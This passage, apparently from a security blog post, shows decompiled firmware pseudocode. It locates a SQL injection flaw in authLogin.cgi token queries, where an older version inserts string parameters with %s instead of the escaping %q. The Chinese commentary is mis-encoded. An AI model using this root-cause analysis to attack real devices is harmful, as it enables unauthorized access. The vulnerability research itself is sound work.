class="string">&quot;AND client_agent = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">32</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">40</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v13], <span class="string">&quot;AND client_app = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">40</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">48</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v14], <span class="string">&quot;AND uid = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">48</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v15], <span class="string">&quot;AND user = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">56</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">64</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v16], <span class="string">&quot;AND create_time = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">64</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">68</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v17], <span class="string">&quot;AND duration = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">68</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">72</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v18], <span class="string">&quot;AND last_access = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">72</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">76</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v19], <span class="string">&quot;AND type = &#x27;%d&#x27; &quot;</span>, *(data + <span class="number">76</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(data + <span class="number">80</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v32[v20], <span class="string">&quot;AND extra_data = &#x27;%s&#x27; &quot;</span>, *(data + <span class="number">80</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = <span class="built_in">strlen</span>(v32);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v32[v21], <span class="string">&quot;AND duration != -1 AND (create_time+duration) &lt; %ld &quot;</span>, a7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v32[<span class="number">0</span>] )</span><br><span class="line">    v36 = sqlite3_mprintf(<span class="string">&quot;WHERE %s&quot;</span>, &amp;v32[<span class="number">4</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v36 = sqlite3_mprintf(byte_7D820);</span><br><span class="line">  <span class="keyword">if</span> ( a5 || a6 )</span><br><span class="line">    v37 = sqlite3_mprintf(<span class="string">&quot;LIMIT %d OFFSET %d&quot;</span>, a6, a5);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v37 = sqlite3_mprintf(byte_7D820);</span><br><span class="line">  v35 = sqlite3_mprintf(<span class="string">&quot;SELECT * FROM QTOKEN %s %s %s;&quot;</span>, v36, v38, v37);</span><br><span class="line">  v34 = sqlite3_open(a2, &amp;v33);</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_free(v35);</span><br><span class="line">    sqlite3_free(v38);</span><br><span class="line">    sqlite3_free(v37);</span><br><span class="line">    v22 = sqlite3_errmsg(v33);</span><br><span class="line">    sub_62648(<span class="string">&quot;open %s failed! (%d, %s)\n&quot;</span>, a2, v34, v22);</span><br><span class="line">    result = <span class="number">4294967276LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_busy_timeout(v33, <span class="number">60000LL</span>);</span><br><span class="line">    v34 = sqlite3_exec(v33, v35, a1, a9, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v34 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j_check_db(g_dbfile) )</span><br><span class="line">        j_qtoken_db_init();</span><br><span class="line">      v23 = sqlite3_errmsg(v33);</span><br><span class="line">      sub_62648(<span class="string">&quot;query failed! (%d, %s)\n&quot;</span>, v34, v23);</span><br><span class="line">    &#125;</span><br><span class="line">    sqlite3_close(v33);</span><br><span class="line">    sqlite3_free(v35);</span><br><span class="line">    sqlite3_free(v38);</span><br><span class="line">    sqlite3_free(v37);</span><br><span class="line">    <span class="keyword">if</span> ( v34 )</span><br><span class="line">      result = <span class="number">4294967272LL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2234</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_649A4</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">int</span> a3, _BYTE *a4, <span class="type">int</span> a5, <span class="type">int</span> a6, __int64 a7, __int64 a8, __int64 a9)</span></span><br><span class="line">&#123;</span><br><span class="line">  v41 = <span class="number">0LL</span>;</span><br><span class="line">  v44 = <span class="number">0LL</span>;</span><br><span class="line">  v43 = <span class="number">0LL</span>;</span><br><span class="line">  v42 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v38, <span class="number">0</span>, <span class="keyword">sizeof</span>(v38));</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt; <span class="number">-1</span> || a3 &gt; <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a5 &lt; <span class="number">0</span> || a6 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4294967285LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a4 &amp;&amp; *a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">        v44 = sqlite3_mprintf(<span class="string">&quot;ORDER BY %q DESC &quot;</span>, a4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v44 = sqlite3_mprintf(byte_7E500);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v44 = sqlite3_mprintf(<span class="string">&quot;ORDER BY %q ASC &quot;</span>, a4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v11 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v10, &amp;v38[v11], <span class="string">&quot;AND client_id = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">24</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v13 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v12, &amp;v38[v13], <span class="string">&quot;AND token = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">24</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v15 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v14, &amp;v38[v15], <span class="string">&quot;AND client_agent = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">32</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">40</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v17 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v16, &amp;v38[v17], <span class="string">&quot;AND client_app = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">40</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">48</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v18], <span class="string">&quot;AND uid = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">48</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">56</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v20 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v19, &amp;v38[v20], <span class="string">&quot;AND user = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">56</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">64</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v21], <span class="string">&quot;AND create_time = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">64</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">68</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v22], <span class="string">&quot;AND duration = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">68</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">72</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v23 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v23], <span class="string">&quot;AND last_access = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">72</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">76</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v24 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;v38[v24], <span class="string">&quot;AND type = &#x27;%d&#x27; &quot;</span>, *(a8 + <span class="number">76</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(a8 + <span class="number">80</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = <span class="number">2048</span> - <span class="built_in">strlen</span>(v38);</span><br><span class="line">      v26 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">      sqlite3_snprintf(v25, &amp;v38[v26], <span class="string">&quot;AND extra_data = &#x27;%q&#x27; &quot;</span>, *(a8 + <span class="number">80</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = <span class="built_in">strlen</span>(v38);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v38[v27], <span class="string">&quot;AND duration != -1 AND (create_time+duration) &lt; %ld &quot;</span>, a7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v38[<span class="number">0</span>] )</span><br><span class="line">    v42 = sqlite3_mprintf(<span class="string">&quot;WHERE %s&quot;</span>, &amp;v38[<span class="number">4</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v42 = sqlite3_mprintf(byte_7E500);</span><br><span class="line">  <span class="keyword">if</span> ( a5 || a6 )</span><br><span class="line">    v43 = sqlite3_mprintf(<span class="string">&quot;LIMIT %d OFFSET %d&quot;</span>, a6, a5);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v43 = sqlite3_mprintf(byte_7E500);</span><br><span class="line">  v41 = sqlite3_mprintf(<span class="string">&quot;SELECT * FROM QTOKEN %s %s %s;&quot;</span>, v42, v44, v43);</span><br><span class="line">  v40 = sqlite3_open(a2, &amp;v39);</span><br><span class="line">  <span class="keyword">if</span> ( v40 )</span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_free(v41);</span><br><span class="line">    sqlite3_free(v44);</span><br><span class="line">    sqlite3_free(v43);</span><br><span class="line">    v28 = sqlite3_errmsg(v39);</span><br><span class="line">    sub_63294(<span class="string">&quot;open %s failed! (%d, %s)\n&quot;</span>, a2, v40, v28);</span><br><span class="line">    result = <span class="number">4294967276LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_busy_timeout(v39, <span class="number">60000LL</span>);</span><br><span class="line">    v40 = sqlite3_exec(v39, v41, a1, a9, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v40 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( j_check_db(g_dbfile) )</span><br><span class="line">        j_qtoken_db_init();</span><br><span class="line">      v29 = sqlite3_errmsg(v39);</span><br><span class="line">      sub_63294(<span class="string">&quot;query failed! (%d, %s)\n&quot;</span>, v40, v29);</span><br><span class="line">    &#125;</span><br><span class="line">    sqlite3_close(v39);</span><br><span class="line">    sqlite3_free(v41);</span><br><span class="line">    sqlite3_free(v44);</span><br><span class="line">    sqlite3_free(v43);</span><br><span class="line">    <span class="keyword">if</span> ( v40 )</span><br><span class="line">      result = <span class="number">4294967272LL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°ä½¿ç”¨ä¸€äº›å‚æ•°æ‹¼æ¥ sqlite æŸ¥è¯¢è¯­å¥å¹¶æ‰§è¡Œï¼Œä¸éš¾å‘ç°æ—§ç‰ˆæœ¬ä¸­åœ¨æ‹¼æ¥ SQL è¯­å¥æ—¶å¯¹å­—ç¬¦ä¸²ä½¿ç”¨äº† %sï¼Œè€Œæ²¡æœ‰ä½¿ç”¨å®‰å…¨çš„ %qã€‚</p>
<p>è‡³æ­¤å¯ä»¥çŒœæµ‹æ­¤å‡½æ•°ä¸ºæœ€ç»ˆæ¼æ´ç‚¹ï¼Œæ¥ä¸‹æ¥é€šè¿‡äº¤å‰å¼•ç”¨å°è¯•ä» authLogin.cgi å®šä½ç›¸å…³ä»£ç ã€‚</p>
<p>åœ¨ authLogin.cgi çš„å¤„ç†é€»è¾‘ä¸­ï¼Œå½“ç”¨æˆ·ä¼ å…¥åä¸º app çš„å‚æ•°æ—¶ï¼Œä¼šè¿›å…¥ app_handler å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">app_handler</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v76[<span class="number">8</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">9</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">10</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">11</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">4</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">5</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">6</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">7</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">12</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">13</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v77 = <span class="number">0</span>;</span><br><span class="line">  v73 = <span class="number">0</span>;</span><br><span class="line">  v76[<span class="number">14</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v76[<span class="number">15</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v72 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v84, <span class="number">0</span>, <span class="keyword">sizeof</span>(v84));</span><br><span class="line">  <span class="built_in">memset</span>(v78, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v79, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">  v75 = <span class="number">0</span>;</span><br><span class="line">  v71 = <span class="number">0LL</span>;</span><br><span class="line">  v74[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v74[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v74[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v74[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v2 = CGI_Find_Parameter(a1, <span class="string">&quot;app&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    app = *(v2 + <span class="number">8</span>);</span><br><span class="line">    v4 = CGI_Find_Parameter(a1, <span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_3:</span><br><span class="line">      v68 = *(v4 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    app = <span class="number">0LL</span>;</span><br><span class="line">    v4 = CGI_Find_Parameter(a1, <span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">  &#125;</span><br><span class="line">  v68 = <span class="number">0LL</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">  v5 = CGI_Find_Parameter(a1, <span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v67 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(v76, *(v5 + <span class="number">8</span>), <span class="number">0x81</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v67 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = CGI_Find_Parameter(a1, <span class="string">&quot;remme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v66 = strtol(*(v6 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    v7 = CGI_Find_Parameter(a1, <span class="string">&quot;app_token&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">      app_token = *(v7 + <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v66 = <span class="number">0</span>;</span><br><span class="line">    v7 = CGI_Find_Parameter(a1, <span class="string">&quot;app_token&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  app_token = <span class="number">0LL</span>;</span><br><span class="line">LABEL_9:</span><br><span class="line">  v9 = CGI_Find_Parameter(a1, <span class="string">&quot;renew&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    renew = strtol(*(v9 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    renew = <span class="number">0</span>;</span><br><span class="line">  v11 = CGI_Find_Parameter(a1, <span class="string">&quot;auth&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    auth = strtol(*(v11 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">    v12 = CGI_Find_Parameter(a1, <span class="string">&quot;sid&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    auth = <span class="number">0</span>;</span><br><span class="line">    v12 = CGI_Find_Parameter(a1, <span class="string">&quot;sid&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      sid = *(v12 + <span class="number">8</span>);</span><br><span class="line">      v13 = CGI_Find_Parameter(a1, <span class="string">&quot;client_id&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sid = <span class="number">0LL</span>;</span><br><span class="line">  v13 = CGI_Find_Parameter(a1, <span class="string">&quot;client_id&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v13 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_14:</span><br><span class="line">    client_id = *(v13 + <span class="number">8</span>);</span><br><span class="line">    v15 = CGI_Find_Parameter(a1, <span class="string">&quot;client_app&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v15 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">LABEL_55:</span><br><span class="line">    client_app = <span class="number">0LL</span>;</span><br><span class="line">    v17 = CGI_Find_Parameter(a1, <span class="string">&quot;client_agent&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">LABEL_56:</span><br><span class="line">    client_agent = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_54:</span><br><span class="line">  client_id = <span class="number">0LL</span>;</span><br><span class="line">  v15 = CGI_Find_Parameter(a1, <span class="string">&quot;client_app&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_55;</span><br><span class="line">LABEL_15:</span><br><span class="line">  client_app = *(v15 + <span class="number">8</span>);</span><br><span class="line">  v17 = CGI_Find_Parameter(a1, <span class="string">&quot;client_agent&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_56;</span><br><span class="line">LABEL_16:</span><br><span class="line">  client_agent = *(v17 + <span class="number">8</span>);</span><br><span class="line">LABEL_17:</span><br><span class="line">  v19 = CGI_Find_Parameter(a1, <span class="string">&quot;duration&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v19 || ((v20 = strtol(*(v19 + <span class="number">8</span>), <span class="number">0LL</span>, <span class="number">10</span>), v20 &lt;= <span class="number">0</span>) ? (v21 = v20 == <span class="number">-1</span>) : (v21 = <span class="number">1</span>), v22 = v20, !v21) )</span><br><span class="line">    v22 = <span class="number">90</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !CGI_Find_Parameter(a1, <span class="string">&quot;gen_client_id&quot;</span>) || get_uuid(v79, <span class="number">257</span>, v23, v24, v25, v26, v27, v28, v64) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_411020();</span><br><span class="line">    <span class="keyword">if</span> ( Get_App_Token_Support(app) )</span><br><span class="line">    &#123;</span><br><span class="line">      v48 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">    &#125;</span><br><span class="line">    v42 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( app_token )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">    <span class="keyword">if</span> ( ((v68 != <span class="number">0LL</span>) &amp; v67) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">LABEL_38:</span><br><span class="line">    <span class="keyword">if</span> ( !User_Belongs_To_Group(v68, <span class="string">&quot;administrators&quot;</span>) || b64_Decode_Ex(v84, <span class="number">512LL</span>, v76) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v84) &gt; <span class="number">0x40</span> )</span><br><span class="line">      v84[<span class="number">65</span>] = <span class="number">0</span>;</span><br><span class="line">    v51 = v68;</span><br><span class="line">    <span class="keyword">if</span> ( sub_40D990(v68, v84, <span class="number">1LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v48 = <span class="number">-1</span>;</span><br><span class="line">      sub_40EB90(app, v68, client_id, client_app, client_agent);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v66 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !client_id )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !Get_App_Token(app, v68, v78, <span class="number">257LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">        <span class="built_in">memset</span>(v78, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !Gen_App_Token(app, v68, v78, <span class="number">257LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_39:</span><br><span class="line">      <span class="keyword">if</span> ( !sid )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_63;</span><br><span class="line">      <span class="keyword">if</span> ( auth_get_session(sid, <span class="number">1LL</span>, &amp;unk_43AAB8) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">      v51 = byte_43AB0A;</span><br><span class="line">      <span class="keyword">if</span> ( !User_Belongs_To_Group(byte_43AB0A, <span class="string">&quot;administrators&quot;</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">      <span class="keyword">if</span> ( !v66 )</span><br><span class="line">        <span 